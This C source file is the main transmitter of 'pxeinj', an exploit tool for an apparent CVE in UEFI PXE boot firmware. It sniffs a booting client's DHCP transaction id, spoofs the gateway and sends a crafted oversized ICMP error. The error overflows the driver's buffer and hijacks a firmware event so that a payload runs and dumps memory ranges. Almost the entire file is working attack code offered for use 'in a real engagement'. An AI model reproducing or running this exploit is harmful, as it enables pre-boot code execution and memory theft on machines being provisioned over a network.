/* main.c - the transmitter.
 *
 * Sequence, and why it is in this order:
 *
 *   1. sniffer: read the PXE client's live DHCP xid off the segment.  Without
 *      it the IP layer drops the ICMP error before the vulnerable handler.
 *   2. arm: resolve one address inside the PXEBC private pool page (via the
 *      firmware map from tools/fw_offsets.py, or --pool-base for a known
 *      build) and compute every pointer the payload needs from it.
 *   3. probe: send one undersized, well-formed ICMP error.  Legal path.  It
 *      confirms our spoof, the embedded datagram and the xid are all accepted,
 *      and that the driver's copy loop is reached.  If the client keeps
 *      booting, stop here.
 *   4. overflow: repeat the probe with the graft appended.
 *
 * The probe step is what makes this usable in a real engagement: you get a
 * clear yes/no before writing anything out of bounds.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <getopt.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "pxe_layout.h"
#include "craft.h"
#include "graft.h"
#include "uart.h"

static uint8_t  g_blob[1 << 20];
static size_t   g_blob_len;

static uint64_t parse_u64(const char *s)
{
  return (uint64_t)strtoull(s, NULL, 0);
}

static void usage(void)
{
  fprintf(stderr,
"pxeinj - CVE-2026-97631 DXE memory reader\n"
"\n"
"  pxeinj --target <ip> [options]\n"
"\n"
"  --target <ip>        PXE client being provisioned\n"
"  --spoof <ip>         source; use the client's default gateway\n"
"  --iface <name>       egress interface\n"
"  --xid <hex>          BOOTP transaction id (or let --sniff find it)\n"
"  --sniff              capture the xid passively first\n"
"  --pool-base <hex>    &Mode->IcmpError.  From fw_offsets.py or a prior run\n"
"  --event-off <hex>    pool offset of the IEVENT to hijack (default 504)\n"
"  --payload <file>     payload.bin\n"
"  --param <file>       parameter block from mkparam (hex)\n"
"  --uart <hex>         MMIO UART base the payload should write to\n"
"  --ranges <file>      ranges.txt: one 'start-end' per line\n"
"  --v6                 ICMPv6 mode\n"
"  --probe              legal-path probe only, no out-of-bounds write\n"
"  --send               actually transmit (otherwise dry run + hexdump)\n"
"  --count <n>          retransmit n times (default 3)\n");
}

/* --- ranges.txt -> packed {start,end} array ------------------------------- */
static int load_ranges(const char *path, uint8_t *out, size_t cap, size_t *n)
{
  FILE *f = fopen(path, "r");
  char line[256];
  size_t cnt = 0;
  if (!f) { perror(path); return -1; }
  while (fgets(line, sizeof(line), f)) {
    uint64_t s, e;
    char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '#' || *p == '\n' || !*p) continue;
    if (sscanf(p, "%lli-%lli", (long long *)&s, (long long *)&e) != 2) {
      if (sscanf(p, "%lli:%lli", (long long *)&s, (long long *)&e) != 2) continue;
    }
    if ((cnt + 1) * 16 > cap) break;
    memcpy(out + cnt * 16, &s, 8);
    memcpy(out + cnt * 16 + 8, &e, 8);
    cnt++;
  }
  fclose(f);
  *n = cnt;
  return 0;
}

int main(int argc, char **argv)
{
  const char *target = NULL, *iface = "eth0", *payload_path = NULL;
  const char *ranges_path = NULL, *param_path = NULL;
  uint32_t spoof = 0, xid = 0;
  uint64_t pool_base = 0, event_off = 504, uart_base = 0;
  int do_sniff = 0, v6 = 0, probe_only = 0, do_send = 0, count = 3, i;
  static const struct option lo[] = {
    {"target", 1, 0, 't'}, {"spoof", 1, 0, 's'}, {"iface", 1, 0, 'i'},
    {"xid", 1, 0, 'x'},    {"sniff", 0, 0, 'n'}, {"pool-base", 1, 0, 'b'},
    {"event-off", 1, 0, 'e'}, {"payload", 1, 0, 'p'}, {"param", 1, 0, 'P'},
    {"uart", 1, 0, 'u'},   {"ranges", 1, 0, 'r'}, {"v6", 0, 0, '6'},
    {"probe", 0, 0, 'o'},  {"send", 0, 0, 'S'},  {"count", 1, 0, 'c'},
    {"help", 0, 0, 'h'},   {0, 0, 0, 0}
  };
  int c;

  while ((c = getopt_long(argc, argv, "t:s:i:x:nb:e:p:P:u:r:6oSc:h",
                          lo, NULL)) != -1) {
    switch (c) {
    case 't': target = optarg; break;
    case 's': spoof = inet_addr(optarg); break;
    case 'i': iface = optarg; break;
    case 'x': xid = (uint32_t)strtoul(optarg, NULL, 16); break;
    case 'n': do_sniff = 1; break;
    case 'b': pool_base = parse_u64(optarg); break;
    case 'e': event_off = parse_u64(optarg); break;
    case 'p': payload_path = optarg; break;
    case 'P': param_path = optarg; break;
    case 'u': uart_base = parse_u64(optarg); break;
    case 'r': ranges_path = optarg; break;
    case '6': v6 = 1; break;
    case 'o': probe_only = 1; break;
    case 'S': do_send = 1; break;
    case 'c': count = atoi(optarg); break;
    case 'h': usage(); return 0;
    default:  usage(); return 2;
    }
  }
  if (!target) { usage(); return 2; }

  if (do_sniff && !xid) {
    uint32_t client_ip = 0;
    if (sniff_xid(iface, &xid, &client_ip) == 0) {
      printf("[*] xid 0x%08x from client %08x\n", xid, client_ip);
      if (!spoof) spoof = client_ip;   /* placeholder; set gateway explicitly */
    } else {
      fprintf(stderr, "[!] no DHCP seen on %s, pass --xid\n", iface);
      return 1;
    }
  }
  if (!xid) { fprintf(stderr, "[!] need --xid (or --sniff)\n"); return 2; }
  if (!spoof) { fprintf(stderr, "[!] need --spoof (client's gateway)\n"); return 2; }

  if (payload_path) {
    FILE *f = fopen(payload_path, "rb");
    if (!f) { perror(payload_path); return 1; }
    g_blob_len = fread(g_blob, 1, sizeof(g_blob), f);
    fclose(f);
  }

  /* Build the overflow.  Everything from event_off onward is what lands in
   * the pool; the filler before it exists only so the copy loop runs long
   * enough to reach that address. */
  static uint8_t overflow[64 * 1024];
  size_t overflow_len = 0;
  param_block_t pb;
  graft_args_t  ga;

  if (payload_path && !param_path) {
    fprintf(stderr, "[!] --payload needs --param (see mkparam)\n");
    return 2;
  }

  {
    static uint8_t shadow[GRAFT_EVENT_LEN];
    static uint8_t graftbuf[GRAFT_EVENT_LEN];
    static uint8_t pbuf[PB_LEN];
    static uint8_t rangebuf[4096];
    size_t range_n = 0;

    if (ranges_path && load_ranges(ranges_path, rangebuf, sizeof(rangebuf),
                                   &range_n) < 0)
      return 1;

    memset(&ga, 0, sizeof(ga));
    ga.signal_link_fwd = pool_base ? pool_base + event_off : 0;
    ga.signal_link_bwd = ga.signal_link_fwd;
    ga.notify_tpl      = 31;                        /* TPL_HIGH_LEVEL */
    ga.notify_fn       = pool_base ? pool_base + event_off + 0x100 : 0;
    ga.notify_ctx      = pool_base ? pool_base + event_off + 0x80 : 0;
    build_event_graft(graftbuf, sizeof(graftbuf), &ga);

    memset(&pb, 0, sizeof(pb));
    pb.graft       = pool_base + event_off;
    pb.event       = pool_base + event_off;
    pb.shadow      = pool_base + event_off + 0x60;
    pb.uart        = uart_base;
    pb.uart_stride = 1;
    pb.out_buf     = 0;
    pb.out_cap     = 0;
    pb.ranges      = pool_base + event_off + 0x200;
    pb.range_n     = range_n;
    build_param_block(pbuf, sizeof(pbuf), &pb);

    memcpy(overflow + overflow_len, graftbuf, sizeof(graftbuf));
    overflow_len += sizeof(graftbuf);
    memcpy(overflow + overflow_len, pbuf, sizeof(pbuf));
    overflow_len += sizeof(pbuf);
    memcpy(overflow + overflow_len, g_blob, g_blob_len);
    overflow_len += g_blob_len;
    memcpy(overflow + overflow_len, rangebuf, range_n * 16);
    overflow_len += range_n * 16;
    memcpy(overflow + overflow_len, shadow, sizeof(shadow));
    overflow_len += sizeof(shadow);
  }

  /* Packet. */
  static uint8_t pkt[128 * 1024];
  craft_req_t rq;
  memset(&rq, 0, sizeof(rq));
  rq.src = spoof;
  rq.dst = inet_addr(target);
  rq.icmp_type = 3;
  rq.icmp_code = 3;                       /* port unreachable */
  rq.embed_src = rq.dst;
  rq.embed_dst = htonl(0xffffffffu);      /* broadcast, as during DISCOVER */
  rq.embed_sport = 68;
  rq.embed_dport = 67;
  rq.embed_data[0] = 1;  rq.embed_data[1] = 1;
  rq.embed_data[2] = 6;  rq.embed_data[3] = 0;
  rq.embed_data[4] = (uint8_t)(xid >> 24); rq.embed_data[5] = (uint8_t)(xid >> 16);
  rq.embed_data[6] = (uint8_t)(xid >> 8);  rq.embed_data[7] = (uint8_t)xid;

  size_t plen;

  if (probe_only) {
    /* Legal path: a 504-byte ICMP error is exactly what the buffer holds.
     * Same everything else, so a positive probe means the overflow will
     * reach the handler. */
    rq.off = PXE_ICMP_ERROR_SIZE;
    rq.overflow = (const uint8_t *)"";
    rq.overflow_len = 0;
    plen = craft_icmp4(pkt, sizeof(pkt), &rq);
    printf("[*] probe packet %zu bytes (no overflow), xid 0x%08x\n", plen, xid);
  } else {
    rq.off = (size_t)event_off;
    rq.overflow = overflow;
    rq.overflow_len = overflow_len;
    plen = craft_icmp4(pkt, sizeof(pkt), &rq);
    printf("[*] overflow %zu bytes at +0x%llx from IcmpError, datagram %zu b\n",
           overflow_len, (unsigned long long)event_off, plen);
  }
  if (!plen) { fprintf(stderr, "[!] packet build failed\n"); return 1; }

  /* Hexdump of the interesting window, always useful. */
  {
    size_t start = PXE_GRAFT_START, stop = plen < 96 ? plen : 96;
    printf("    ");
    for (size_t k = start; k < stop; k++)
      printf("%02x%s", pkt[sizeof(ip4_hdr_t) + k], (k & 15) == 15 ? "\n    " : " ");
    printf("\n");
  }

  if (!do_send) {
    printf("[*] dry run.  add --send to transmit.\n");
    return 0;
  }

  int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (fd < 0) { perror("socket"); return 1; }

  for (i = 0; i < count; i++) {
    if (raw_send_l3(fd, iface, pkt, plen, rq.dst, rq.src) < 0) {
      perror("sendto");
      close(fd);
      return 1;
    }
    usleep(120000);
  }
  close(fd);
  printf("[*] sent %d\n", count);
  return 0;
}
